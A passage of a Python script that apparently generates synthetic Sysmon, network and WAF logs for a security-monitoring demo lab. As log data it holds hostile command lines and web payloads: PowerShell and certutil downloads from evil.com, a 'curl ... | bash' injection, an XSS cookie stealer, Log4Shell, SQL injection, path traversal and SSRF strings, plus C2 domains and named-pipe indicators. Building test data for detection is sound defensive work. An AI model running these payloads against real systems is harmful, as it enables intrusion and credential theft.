         "powershell.exe -NoProfile -enc SQBFAFgA"),
        ("C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\whoami.exe",
         "whoami /all"),
        ("C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\net.exe",
         "net user hacker P@ssw0rd /add"),
        ("C:\\Windows\\explorer.exe", "C:\\Users\\Public\\malware.exe",
         "malware.exe --connect 185.215.113.206"),
        ("C:\\Windows\\System32\\mshta.exe", "C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c powershell.exe -ep bypass -c IEX(iwr http://evil.com/ps.ps1)"),
        ("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c certutil -urlcache -f http://evil.com/payload.exe"),
        ("C:\\Windows\\System32\\wbem\\wmiprvse.exe", "C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c whoami"),
    ]
    for i, (parent, child, cmd) in enumerate(procs):
        for j in range(4):
            events.append(sysmon_op_event(
                1, source_image=parent, target_image=child,
                command_line=cmd,
                user=random.choice(THREAT_ACTORS),
                msg=f"Process Create: {child.split(chr(92))[-1]}",
                offset=i*5+j,
            ))

    # Extra Event 1 with suspicious parent processes (for the "Suspicious Process Chains" widget)
    suspicious_parents = [
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Windows\\System32\\mshta.exe",
        "C:\\Windows\\System32\\wscript.exe",
        "C:\\Windows\\System32\\wbem\\wmiprvse.exe",
    ]
    for i, parent in enumerate(suspicious_parents):
        for j in range(3):
            events.append(sysmon_op_event(
                1, source_image=parent,
                target_image=f"C:\\Windows\\System32\\{'cmd.exe' if j % 2 == 0 else 'powershell.exe'}",
                command_line=f"{'cmd.exe /c' if j % 2 == 0 else 'powershell.exe -ep bypass'} suspicious_command_{i}_{j}",
                user=random.choice(THREAT_ACTORS),
                msg="Process Create: suspicious child process",
                offset=100+i*5+j,
            ))

    # ── Event 3: Network Connections (C2 ports) ──
    c2_ports = [4444, 8443, 8080, 9090, 5555, 1337, 3333, 6666, 443]
    c2_ips = ["185.215.113.206", "103.253.41.45", "89.34.111.113", "5.252.178.48"]
    for i, port in enumerate(c2_ports):
        for j in range(3):
            events.append(sysmon_op_event(
                3,
                source_image=random.choice([
                    "C:\\Windows\\System32\\cmd.exe",
                    "C:\\Users\\Public\\beacon.exe",
                    "C:\\Windows\\System32\\powershell.exe",
                ]),
                dest_ip=random.choice(c2_ips),
                dest_port=port,
                dest_hostname=random.choice(["evil-c2.duckdns.org", "beacon.example.xyz", "update.evil.cc"]),
                user=random.choice(THREAT_ACTORS),
                msg=f"Network connection detected to port {port}",
                offset=200+i*4+j,
            ))

    # ── Event 8: CreateRemoteThread (Process Injection T1055) ──
    for i in range(8):
        events.append(sysmon_op_event(
            8,
            source_image=random.choice([
                "C:\\Users\\Public\\injector.exe",
                "C:\\Windows\\System32\\cmd.exe",
                "C:\\Temp\\payload.exe",
            ]),
            target_image=random.choice([
                "C:\\Windows\\System32\\svchost.exe",
                "C:\\Windows\\System32\\explorer.exe",
                "C:\\Windows\\System32\\notepad.exe",
            ]),
            user=random.choice(THREAT_ACTORS),
            msg="CreateRemoteThread detected",
            offset=300+i,
        ))

    # ── Event 10: ProcessAccess to LSASS (T1003 Credential Dump) ──
    for i in range(8):
        events.append(sysmon_op_event(
            10,
            source_image=random.choice([
                "C:\\Temp\\mimikatz.exe",
                "C:\\Tools\\procdump.exe",
                "C:\\Windows\\System32\\rundll32.exe",
            ]),
            target_image="C:\\Windows\\System32\\lsass.exe",
            granted_access="0x1010",
            user=random.choice(THREAT_ACTORS),
            msg="Process accessed lsass.exe",
            offset=400+i,
        ))

    # ── Event 11: File Creation (Startup folder persistence T1547) ──
    startup_files = [
        "C:\\Users\\joffrey\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe",
        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat",
        "C:\\Users\\arya\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs",
    ]
    for i, fname in enumerate(startup_files):
        for j in range(2):
            events.append(sysmon_op_event(
                11,
                source_image="C:\\Windows\\System32\\cmd.exe",
                target_filename=fname,
                user=random.choice(THREAT_ACTORS),
                msg=f"File created: {fname.split(chr(92))[-1]}",
                offset=500+i*3+j,
            ))

    # More Event 11: General file creates
    for i in range(6):
        events.append(sysmon_op_event(
            11,
            source_image="C:\\Windows\\System32\\powershell.exe",
            target_filename=f"C:\\Temp\\payload_{i}.exe",
            user=random.choice(THREAT_ACTORS),
            msg=f"File created: payload_{i}.exe",
            offset=520+i,
        ))

    # BLUELIGHT-style periodic screenshot staging.
    for i in range(8):
        events.append(sysmon_op_event(
            11,
            source_image="C:\\Users\\Public\\bluelight.exe",
            target_filename=f"C:\\Users\\joffrey\\AppData\\Local\\Temp\\capture_{i}.jpg",
            user="joffrey",
            msg=f"File created: capture_{i}.jpg",
            offset=530,
        ))

    for i, browser in enumerate([
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "C:\\Program Files\\Internet Explorer\\iexplore.exe",
    ]):
        events.append(sysmon_op_event(
            10,
            host="WS01.sevenkingdoms.local",
            user="joffrey",
            source_image="C:\\Users\\Public\\bluelight.exe",
            target_image=browser,
            granted_access="0x1fffff",
            msg=f"BLUELIGHT browser credential access: {ntpath.basename(browser)}",
            offset=545 + i,
        ))

    events.extend(_bluelight_kill_chain_sysmon_op_events())

    # ── Event 17: Named Pipe Creation (C2 indicator) ──
    # Includes pipe-name fingerprints used by:
    #   - Cobalt Strike post-ex: MSSE-*, postex_*, postex_ssh_*, status_*,
    #     msagent_*, interprocess, mojo, DserNamePipe, winsock, UIA_PIPE
    #   - PsExec lateral movement: PSEXESVC, csexec, remcom, PAExec
    #   - Mimikatz coercion / RPC: lsass, ntsvcs, scerpc, samr, evil_pipe
    pipes = [
        # Generic / placeholders kept for backwards compatibility
        "\\\\.\\pipe\\evil_pipe", "\\\\.\\pipe\\cobaltstrike",
        "\\\\.\\pipe\\meterpreter", "\\\\.\\pipe\\msf_rpc",
        "\\\\.\\pipe\\beacon_pipe",
        # Cobalt Strike named-pipe IOCs (T1055.011)
        "\\\\.\\pipe\\MSSE-1234-server",
        "\\\\.\\pipe\\MSSE-9876-secret",
        "\\\\.\\pipe\\postex_4f3c",
        "\\\\.\\pipe\\postex_ssh_a1b2",
        "\\\\.\\pipe\\status_77",
        "\\\\.\\pipe\\msagent_55",
        "\\\\.\\pipe\\interprocess_8e",
        "\\\\.\\pipe\\mojo.5550.7421.81",
        "\\\\.\\pipe\\chrome.5550.7421.81",
        "\\\\.\\pipe\\DserNamePipe22",
        "\\\\.\\pipe\\winsock-2",
        "\\\\.\\pipe\\UIA_PIPE_010",
        # PsExec named-pipe IOCs (T1021.002)
        "\\\\.\\pipe\\PSEXESVC",
        "\\\\.\\pipe\\PSEXESVC-WS01-1234-stdin",
        "\\\\.\\pipe\\PSEXESVC-WS02-5678-stdout",
        "\\\\.\\pipe\\psexec",
        "\\\\.\\pipe\\csexec",
        "\\\\.\\pipe\\remcom_communicaton",
        "\\\\.\\pipe\\PAExec-1234-WS01",
        # Mimikatz / coercion named pipes (T1003)
        "\\\\.\\pipe\\mimikatz",
        "\\\\.\\pipe\\mimikatz_lsass",
        "\\\\.\\pipe\\lsadump_secrets",
        "\\\\.\\pipe\\ntsvcs_steal",
    ]
    for i, pipe in enumerate(pipes):
        for j in range(2):
            events.append(sysmon_op_event(
                17,
                source_image="C:\\Windows\\System32\\cmd.exe",
                pipe_name=pipe,
                user=random.choice(THREAT_ACTORS),
                msg=f"Pipe Created: {pipe}",
                offset=600+i*3+j,
            ))

    # ── Event 22: DNS Queries ──
    # Suspicious TLDs for beaconing detection
    suspicious_domains = [
        "evil-c2.duckdns.org", "beacon.malware.xyz", "update.evil.info",
        "c2.attacker.top", "data.exfil.pw", "dns.tunnel.cc",
        "command.control.tk", "stealer.bad.bit",
    ]
    normal_domains = [
        "www.google.com", "login.microsoftonline.com", "api.github.com",
        "cdn.cloudflare.com",
    ]
    # Suspicious domain queries
    for i, domain in enumerate(suspicious_domains):
        for j in range(5):
            events.append(sysmon_op_event(
                22,
                source_image=random.choice([
                    "C:\\Windows\\System32\\cmd.exe",
                    "C:\\Users\\Public\\beacon.exe",
                    "C:\\Windows\\System32\\powershell.exe",
                ]),
                query_name=domain,
                query_results=random.choice(c2_ips),
                user=random.choice(THREAT_ACTORS),
                msg=f"DNS query: {domain}",
                offset=700+i*6+j,
            ))
    # Normal DNS queries (for contrast)
    for i, domain in enumerate(normal_domains):
        for j in range(3):
            events.append(sysmon_op_event(
                22,
                source_image="C:\\Windows\\System32\\svchost.exe",
                query_name=domain,
                query_results="142.250.80.46",
                user="SYSTEM",
                msg=f"DNS query: {domain}",
                offset=800+i*4+j,
            ))

    return events


# ═══════════════════════════════════════════════════════════════════
#  Main Orchestrator
# ═══════════════════════════════════════════════════════════════════

def write_jsonl(filepath, events):
    """Write events as NDJSON (one JSON object per line)."""
    with open(filepath, 'w') as f:
        for event in events:
            f.write(json.dumps(event, default=str) + "\n")
    return len(events)


# ═══════════════════════════════════════════════════════════════════
#  Sysmon Network Events (Event ID 3 — dedicated network parser)
# ═══════════════════════════════════════════════════════════════════

def sysmon_network_event(host=None, user=None, image=None, protocol="tcp",
                         src_ip=None, src_port=None, dst_ip=None, dst_port=None,
                         dst_hostname=None, initiated="true", rule_name=None,
                         technique_name=None, technique_id=None, msg=None, offset=0):
    """Generate a Sysmon Event ID 3 (Network Connection) for the network parser.

    Uses OCI Log Analytics field names for query compatibility alongside
    Sysmon-native field names for reference.
    """
    if host is None:
        host = random.choice(SEVEN_KINGDOMS_HOSTS)
    if user is None:
        user = random.choice(THREAT_ACTORS)
    if src_ip is None:
        src_ip = random.choice(CORPORATE_IPS)
    if src_port is None:
        src_port = random.randint(49152, 65535)
    proc = image or "C:\\Windows\\System32\\cmd.exe"
    return {
        # OCI Log Analytics mapped fields
        "Event ID": 3,
        "Host Name (Server)": host,
        "Process Name": proc,
        "Source IP": src_ip,
        "Source Port": src_port,
        "Destination IP": dst_ip or "",
        "Destination Port": dst_port or 443,
        "Destination Hostname": dst_hostname or "",
        "Technique Name": technique_name or "",
        "Technique ID": technique_id or "",
        # Sysmon-native fields (for raw reference)
        "@timestamp": ts(offset),
        "EventID": 3,
        "Computer": host,
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "User": user,
        "Image": proc,
        "Protocol": protocol,
        "SourceIp": src_ip,
        "SourcePort": src_port,
        "DestinationIp": dst_ip or "",
        "DestinationPort": dst_port or 443,
        "DestinationHostname": dst_hostname or "",
        "Initiated": initiated,
        "RuleName": rule_name or "",
        "TechniqueName": technique_name or "",
        "TechniqueId": technique_id or "",
        "AccountName": user.split("\\")[-1] if "\\" in user else user,
        "msg": msg or f"Network connection: {proc} -> {dst_ip}:{dst_port}",
    }


def generate_sysmon_network_events():
    """Generate Sysmon Event ID 3 (network connection) events for all attack scenarios."""
    events = []
    c2_ips = ["185.215.113.206", "103.253.41.45", "89.34.111.113", "5.252.178.48"]

    # ── Lateral Movement: SMB (port 445) ──
    smb_tools = [
        "C:\\Windows\\System32\\psexec.exe",
        "C:\\Windows\\System32\\net.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\powershell.exe",
        "C:\\Windows\\System32\\robocopy.exe",
    ]
    for i, tool in enumerate(smb_tools):
        for j in range(4):
            events.append(sysmon_network_event(
                image=tool, dst_ip=random.choice(CORPORATE_IPS), dst_port=445,
                protocol="tcp", technique_name="SMB/Windows Admin Shares",
                technique_id="T1021.002",
                msg=f"SMB lateral movement: {tool.split(chr(92))[-1]} -> 445",
                offset=i * 5 + j,
            ))

    # ── Lateral Movement: WinRM (port 5985/5986) ──
    for i in range(8):
        events.append(sysmon_network_event(
            image=random.choice([
                "C:\\Windows\\System32\\powershell.exe",
                "C:\\Windows\\System32\\wsmprovhost.exe",
            ]),
            dst_ip=random.choice(CORPORATE_IPS), dst_port=random.choice([5985, 5986]),
            technique_name="Windows Remote Management", technique_id="T1021.006",
            msg="WinRM lateral movement",
            offset=50 + i,
        ))

    # ── Lateral Movement: RDP (port 3389) ──
    for i in range(6):
        events.append(sysmon_network_event(
            image=random.choice([
                "C:\\Windows\\System32\\mstsc.exe",
                "C:\\Windows\\System32\\cmd.exe",
            ]),
            dst_ip=random.choice(CORPORATE_IPS), dst_port=3389,
            technique_name="Remote Desktop Protocol", technique_id="T1021.001",
            msg="RDP lateral movement",
            offset=70 + i,
        ))

    # ── C2 Beacon: HTTPS to suspicious IPs ──
    beacon_procs = [
        "C:\\Windows\\System32\\rundll32.exe",
        "C:\\Windows\\System32\\regsvr32.exe",
        "C:\\Windows\\System32\\powershell.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\certutil.exe",
        "C:\\Windows\\System32\\mshta.exe",
    ]
    for i, proc in enumerate(beacon_procs):
        for j in range(5):
            events.append(sysmon_network_event(
                image=proc, dst_ip=random.choice(c2_ips),
                dst_port=random.choice([443, 8443, 4443, 8080]),
                dst_hostname=random.choice([
                    "evil-c2.duckdns.org", "beacon.malware.xyz",
                    "update.evil.cc", "cdn-static.attacker.top",
                ]),
                technique_name="Application Layer Protocol", technique_id="T1071.001",
                msg=f"C2 beacon: {proc.split(chr(92))[-1]} -> HTTPS",
                offset=100 + i * 6 + j,
            ))

    # BLUELIGHT-style drive-by compromise: iexplore.exe reaching non-Microsoft hosts.
    drive_by_hosts = [
        ("jquery.services", "203.0.113.45"),
        ("malicious-news.example.com", "198.51.100.20"),
        ("watering-hole.attacker.top", "203.0.113.99"),
        ("compromised-cdn.bad.example", "198.51.100.55"),
    ]
    for i, (host, ip) in enumerate(drive_by_hosts):
        for j in range(3):
            events.append(sysmon_network_event(
                host="WS01.sevenkingdoms.local", user="joffrey",
                image="C:\\Program Files\\Internet Explorer\\iexplore.exe",
                dst_ip=ip, dst_port=443, dst_hostname=host,
                technique_name="Drive-by Compromise", technique_id="T1189",
                msg=f"BLUELIGHT drive-by: iexplore -> {host}",
                offset=120 + i * 4 + j,
            ))

    # BLUELIGHT YARA Google App C2: non-browser process reaching Google services.
    google_c2_hosts = ["mail.google.com", "myaccount.google.com"]
    google_procs = [
        "C:\\Users\\Public\\bluelight.exe",
        "C:\\Windows\\System32\\rundll32.exe",
    ]
    for i, proc in enumerate(google_procs):
        for j, host in enumerate(google_c2_hosts):
            events.append(sysmon_network_event(
                host="WS01.sevenkingdoms.local", user="joffrey",
                image=proc, dst_ip="142.250.80.46", dst_port=443,
                dst_hostname=host,
                technique_name="Application Layer Protocol",
                technique_id="T1071.001",
                msg=f"BLUELIGHT YARA: Google App C2 from {proc.split(chr(92))[-1]}",
                offset=135 + i * 2 + j,
            ))

    # BLUELIGHT-style Microsoft Graph / cloud storage C2 traffic.
    graph_procs = [
        "C:\\Users\\Public\\bluelight.exe",
        "C:\\Windows\\System32\\rundll32.exe",
        "C:\\Windows\\System32\\powershell.exe",
    ]
    for i, proc in enumerate(graph_procs):
        for j in range(4):
            events.append(sysmon_network_event(
                image=proc,
                dst_ip=random.choice(c2_ips),
                dst_port=443,
                dst_hostname=random.choice(["graph.microsoft.com", "login.microsoftonline.com"]),
                technique_name="Application Layer Protocol",
                technique_id="T1071.001",
                msg=f"Cloud API beacon: {proc.split(chr(92))[-1]} -> Microsoft Graph",
                offset=145 + i * 5 + j,
            ))

    for i in range(4):
        events.append(sysmon_network_event(
            host="WS01.sevenkingdoms.local",
            user="joffrey",
            image="C:\\Users\\Public\\bluelight.exe",
            dst_ip=random.choice(c2_ips),
            dst_port=443,
            dst_hostname="graph.microsoft.com",
            technique_name="Application Layer Protocol",
            technique_id="T1071.001",
            msg="BLUELIGHT Graph API exfiltration",
            offset=162 + i,
        ))

    # ── DNS Tunneling: port 53 from suspicious processes ──
    # Detection ``sysmon_dns_tunneling_via_network_connection`` matches:
    #   Destination Port = 53 AND Initiated = true AND
    #   Process Name in (powershell.exe, cmd.exe, nslookup.exe, iodine.exe,
    #   dnscat2.exe, dns2tcp.exe), excluding svchost.exe and dns.exe.
    dns_tunnel_procs = [
        "C:\\Windows\\System32\\powershell.exe",
        "C:\\Windows\\System32\\nslookup.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Tools\\iodine.exe",
        "C:\\Tools\\dnscat2.exe",
        "C:\\Tools\\dns2tcp.exe",
    ]
    for i, proc in enumerate(dns_tunnel_procs):
        for j in range(3):
            events.append(sysmon_network_event(
                image=proc,
                dst_ip="8.8.8.8", dst_port=53, protocol="udp",
                initiated="true",
                technique_name="DNS", technique_id="T1071.004",
                msg=f"DNS tunnel via {proc.split(chr(92))[-1]}",
                offset=170 + i * 4 + j,
            ))

    # ── Kerberoasting: Kerberos (port 88) ──
    for i in range(6):
        events.append(sysmon_network_event(
            image=random.choice([
                "C:\\Tools\\rubeus.exe",
                "C:\\Windows\\System32\\powershell.exe",
                "C:\\Temp\\mimikatz.exe",
            ]),
            dst_ip=random.choice(CORPORATE_IPS), dst_port=88,
            technique_name="Kerberoasting", technique_id="T1558.003",
            msg="Kerberos ticket request from suspicious process",
            offset=190 + i,
        ))

    # ── LDAP Reconnaissance: port 389/636 ──
    for i in range(6):
        events.append(sysmon_network_event(
            image=random.choice([
                "C:\\Tools\\sharphound.exe",
                "C:\\Windows\\System32\\powershell.exe",
                "C:\\Tools\\adfind.exe",
            ]),
            dst_ip=random.choice(CORPORATE_IPS),
            dst_port=random.choice([389, 636, 3268]),
            technique_name="Account Discovery", technique_id="T1087.002",
            msg="LDAP enumeration",
            offset=210 + i,
        ))

    # ── Cobalt Strike C2 patterns ──
    for i in range(6):
        events.append(sysmon_network_event(
            image=random.choice([
                "C:\\Windows\\System32\\rundll32.exe",
                "C:\\Windows\\System32\\dllhost.exe",
            ]),
            dst_ip=random.choice(c2_ips),
            dst_port=random.choice([80, 443, 50050]),
            dst_hostname="cdn-update.cobalt.example.com",
            technique_name="Application Layer Protocol", technique_id="T1071.001",
            msg="Cobalt Strike beacon communication",
            offset=230 + i,
        ))

    # ── Mimikatz network activity ──
    for i in range(4):
        events.append(sysmon_network_event(
            image="C:\\Temp\\mimikatz.exe",
            dst_ip=random.choice(CORPORATE_IPS),
            dst_port=random.choice([88, 389, 445]),
            technique_name="OS Credential Dumping", technique_id="T1003.001",
            msg="Mimikatz accessing DC services",
            offset=250 + i,
        ))

    # ── LOLBin outbound connections ──
    lolbins = [
        "C:\\Windows\\System32\\certutil.exe",
        "C:\\Windows\\System32\\bitsadmin.exe",
        "C:\\Windows\\System32\\mshta.exe",
        "C:\\Windows\\System32\\regsvr32.exe",
    ]
    for i, lolbin in enumerate(lolbins):
        for j in range(3):
            events.append(sysmon_network_event(
                image=lolbin, dst_ip=random.choice(c2_ips),
                dst_port=random.choice([80, 443]),
                technique_name="Signed Binary Proxy Execution", technique_id="T1218",
                msg=f"LOLBin outbound: {lolbin.split(chr(92))[-1]}",
                offset=270 + i * 4 + j,
            ))

    # ── Normal traffic (for contrast) ──
    normal_procs = [
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Windows\\System32\\svchost.exe",
        "C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE",
    ]
    for i, proc in enumerate(normal_procs):
        for j in range(5):
            events.append(sysmon_network_event(
                image=proc, dst_ip="142.250.80.46", dst_port=443,
                dst_hostname="www.google.com",
                user="SYSTEM" if "svchost" in proc else random.choice(THREAT_ACTORS),
                msg=f"Normal HTTPS: {proc.split(chr(92))[-1]}",
                offset=300 + i * 6 + j,
            ))

    return events


# ═══════════════════════════════════════════════════════════════════
#  WAF Security Event Generators (OWASP Attacks)
# ═══════════════════════════════════════════════════════════════════

ATTACKER_IPS = ["185.220.101.1", "91.92.109.18", "45.33.32.156", "194.5.249.7",
                "23.129.64.100", "51.15.43.205", "178.128.23.9"]
ATTACKER_UAS = ["sqlmap/1.7", "Nikto/2.1.6", "Mozilla/5.0 (compatible; Hydra/9.0)",
                "python-requests/2.28.0", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
                "Gobuster/3.6", "OWASP ZAP/2.14.0"]
WAF_HOST = "sevenkingdoms.example.com"


def waf_event(action, http_method, url, rule_type="PROTECTION_RULES", rule_key="",
              client_ip=None, user_agent=None, response_code="403",
              body_data="", content_type="text/html", trace_id=None,
              request_headers=None, offset=0):
    """Generate a WAF security event."""
    if client_ip is None:
        client_ip = random.choice(ATTACKER_IPS)
    if user_agent is None:
        user_agent = random.choice(ATTACKER_UAS)
    headers = request_headers if request_headers is not None else f"Host: {WAF_HOST}"
    return {
        "timeCreated": ts(offset),
        "action": action,
        "httpMethod": http_method,
        "requestUrl": url,
        "queryString": url.split("?", 1)[1] if "?" in url else "",
        "clientAddress": client_ip,
        "countryCode": random.choice(["RU", "CN", "KP", "IR", "US", "DE", "BR"]),
        "userAgent": user_agent,
        "responseCode": response_code,
        "type": rule_type,
        "protectionRuleKey": rule_key,
        "protectionRuleAction": action,
        "bodyData": body_data,
        "contentType": content_type,
        "referer": "",
        "requestHeaders": headers,
        "wafPolicy": "seven-kingdoms-portal-waf",
        "fingerprint": uuid.uuid4().hex[:12],
        "traceId": trace_id or f"trace_{uuid.uuid4().hex[:16]}",
        "hostname": WAF_HOST,
        "msg": f"WAF {action}: {http_method} {url[:80]}",
    }


def lb_access_event(http_method, url, status_code, client_ip=None, user_agent=None,
                    bytes_sent="256", offset=0):
    """Generate a Load Balancer access log event."""
    if client_ip is None:
        client_ip = random.choice(ATTACKER_IPS)
    if user_agent is None:
        user_agent = random.choice(ATTACKER_UAS)
    return {
        "timeCreated": ts(offset),
        "httpMethod": http_method,
        "requestUrl": url,
        "uriPath": url.split("?")[0],
        "queryString": url.split("?", 1)[1] if "?" in url else "",
        "clientAddress": client_ip,
        "userAgent": user_agent,
        "statusCode": str(status_code),
        "backendStatusCode": str(status_code),
        "backendAddress": "10.0.1.50:9010",
        "bytesReceived": str(random.randint(100, 5000)),
        "bytesSent": bytes_sent,
        "requestProcessingTime": str(random.randint(1, 500)),
        "hostname": WAF_HOST,
        "lbName": "seven-kingdoms-portal-lb",
        "listenerName": "http-listener",
        "contentType": "application/json",
        "referer": f"https://{WAF_HOST}/",
        "msg": f"{http_method} {url} {status_code}",
    }


def webapp_event(attack_type, owasp_category, url, http_method="GET",
                 status_code="200", payload="", client_ip=None,
                 user_agent=None, offset=0):
    """Generate a web application security event."""
    if client_ip is None:
        client_ip = random.choice(ATTACKER_IPS)
    if user_agent is None:
        user_agent = random.choice(ATTACKER_UAS)
    return {
        "timestamp": ts(offset),
        "httpMethod": http_method,
        "requestUrl": url,
        "uriPath": url.split("?")[0],
        "queryString": url.split("?", 1)[1] if "?" in url else "",
        "clientAddress": client_ip,
        "userAgent": user_agent,
        "statusCode": str(status_code),
        "attackType": attack_type,
        "attackPayload": payload,
        "owaspCategory": owasp_category,
        "vulnerabilityId": f"CVE-2024-DEMO-{random.randint(100, 999)}",
        "sessionId": f"sess_{uuid.uuid4().hex[:12]}",
        "appName": "seven-kingdoms-portal",
        "requestId": f"req_{uuid.uuid4().hex[:8]}",
        "hostname": WAF_HOST,
        "requestBody": payload,
        "contentType": "application/json",
        "user": random.choice(["anonymous", "joffrey", "cersei", "tyrion"]),
        "msg": f"{attack_type}: {http_method} {url[:80]}",
    }


def application_event(service_name, message="Request completed", level="INFO",
                      url="/", http_method="GET", status_code="200",
                      response_time_ms=150, client_ip=None, user_agent=None,
                      user=None, trace_id=None, session_id=None,
                      span_name=None, span_attributes="", attack_type=None,
                      attack_severity=None, waf_score=None, db_target=None,
                      error_type=None, slow_request=False, orders_sync_created=0,
                      orders_sync_updated=0, orders_sync_failed=0,
                      orders_sync_source=None, referrer="https://app.example.com/",
                      response_headers="Content-Type: application/json; X-Frame-Options: DENY",
                      content_type="application/json", hostname=None, offset=0):
    """Generate application/browser telemetry shaped for the SOC app dashboards."""
    if client_ip is None:
        client_ip = random.choice(CORPORATE_IPS)
    if user_agent is None:
        user_agent = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
        ])
    if user is None:
        user = random.choice(["cersei", "jaime", "tyrion", "arya", "sansa", "jon"])
    if trace_id is None:
        trace_id = f"trace_{uuid.uuid4().hex[:16]}"
    if session_id is None:
        session_id = f"sess_{uuid.uuid4().hex[:12]}"
    if span_name is None:
        span_name = f"HTTP {http_method} {url.split('?', 1)[0]}"
    if hostname is None:
        hostname = "crm-portal-01" if service_name == "enterprise-crm-portal" else "drone-shop-01"

    return {
        "timestamp": ts(offset),
        "serviceName": service_name,
        "traceId": trace_id,
        "httpMethod": http_method,
        "requestUrl": url,
        "uriPath": url.split("?", 1)[0],
        "queryString": url.split("?", 1)[1] if "?" in url else "",
        "statusCode": str(status_code),
        "responseTimeMs": response_time_ms,
        "clientAddress": client_ip,
        "userAgent": user_agent,
        "user": user,
        "sessionId": session_id,
        "requestId": f"req_{uuid.uuid4().hex[:8]}",
        "contentType": content_type,
        "referrer": referrer,
        "responseHeaders": response_headers,
        "spanName": span_name,
        "spanAttributes": span_attributes,
        "securityAttackType": attack_type,
        "securityAttackSeverity": attack_severity,
        "wafScore": waf_score,
        "dbTarget": db_target,
        "errorType": error_type,
        "slowRequest": "true" if slow_request else "false",
        "ordersSyncCreated": orders_sync_created,
        "ordersSyncUpdated": orders_sync_updated,
        "ordersSyncFailed": orders_sync_failed,
        "ordersSyncSource": orders_sync_source,
        "level": level,
        "hostname": hostname,
        "message": message,
    }


def generate_waf_events():
    """Generate WAF security events for all OWASP attack types."""
    events = []

    # SQL Injection attacks (blocked)
    sqli_payloads = [
        "/vulnerable/search?q=1' OR '1'='1",
        "/vulnerable/search?q=' UNION SELECT username,password FROM users--",
        "/vulnerable/login?user=admin'--&pass=x",
        "/vulnerable/api/users?id=1; DROP TABLE sessions",
        "/vulnerable/search?q=' AND SLEEP(5)--",
        "/vulnerable/search?q=1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "/vulnerable/search?q=' UNION SELECT NULL,table_name FROM INFORMATION_SCHEMA.TABLES--",
    ]
    for i, payload in enumerate(sqli_payloads):
        events.append(waf_event("BLOCK", "GET", payload, rule_key="941100", offset=i))
    # SQLi allowed through (detection mode)
    events.append(waf_event("DETECT", "GET", "/vulnerable/search?q=1' OR '1'='1",
                            rule_key="941100", response_code="200", offset=8))

    # XSS attacks (blocked)
    xss_payloads = [
        "/vulnerable/comment?text=<script>alert('XSS')</script>",
        "/vulnerable/search?q=<img src=x onerror=alert(document.cookie)>",
        "/vulnerable/profile?name=<svg onload=alert(1)>",
        "/vulnerable/feedback?msg=<iframe src=javascript:alert('XSS')>",
        "/vulnerable/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    ]
    for i, payload in enumerate(xss_payloads):
        events.append(waf_event("BLOCK", "GET", payload, rule_key="941160", offset=10 + i))

    # Path Traversal attacks
    traversal_payloads = [
        "/vulnerable/file?path=../../../etc/passwd",
        "/vulnerable/download?file=..%2f..%2f..%2fetc%2fshadow",
        "/vulnerable/read?doc=....//....//etc/passwd",
        "/vulnerable/static/../../../proc/self/environ",
    ]
    for i, payload in enumerate(traversal_payloads):
        events.append(waf_event("BLOCK", "GET", payload, rule_key="930100", offset=16 + i))

    # Command Injection attacks
    cmdi_payloads = [
        "/vulnerable/ping?host=; cat /etc/passwd",
        "/vulnerable/dns?lookup=| id",
        "/vulnerable/exec?cmd=$(whoami)",
        "/vulnerable/api/run?input=`/bin/bash -c 'curl http://evil.com/shell.sh | bash'`",
    ]
    for i, payload in enumerate(cmdi_payloads):
        events.append(waf_event("BLOCK", "GET", payload, rule_key="932100", offset=21 + i))

    # SSRF attacks
    ssrf_payloads = [
        "/vulnerable/fetch?url=http://169.254.169.254/latest/meta-data/",
        "/vulnerable/proxy?target=http://metadata.oraclecloud.com/opc/v2/",
        "/vulnerable/image?src=http://127.0.0.1:8080/admin",
        "/vulnerable/webhook?callback=http://10.0.1.50:9090/internal-api",
    ]
    for i, payload in enumerate(ssrf_payloads):
        events.append(waf_event("BLOCK", "GET", payload, rule_key="934100", offset=26 + i))

    # XXE attacks
    events.append(waf_event("BLOCK", "POST", "/vulnerable/api/xml",
                            rule_key="933100",
                            body_data='<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                            content_type="application/xml", offset=31))

    # SSTI attacks
    ssti_payloads = [
        "/vulnerable/template?name={{7*7}}",
        "/vulnerable/render?tpl={{config.__class__.__init__.__globals__}}",
        "/vulnerable/preview?data={{''.__class__.__mro__[1].__subclasses__()}}",
    ]
    for i, payload in enumerate(ssti_payloads):
        events.append(waf_event("BLOCK", "GET", payload, rule_key="934200", offset=33 + i))

    # Log4Shell attacks
    log4j_payloads = [
        "/vulnerable/api/log?msg=${jndi:ldap://evil.com/exploit}",
        "/vulnerable/search?q=${${lower:j}${upper:n}${lower:d}${upper:i}:ldap://evil.com/a}",
    ]
    for i, payload in enumerate(log4j_payloads):
        events.append(waf_event("BLOCK", "GET", payload, rule_key="944100", offset=37 + i))

    # NoSQL injection
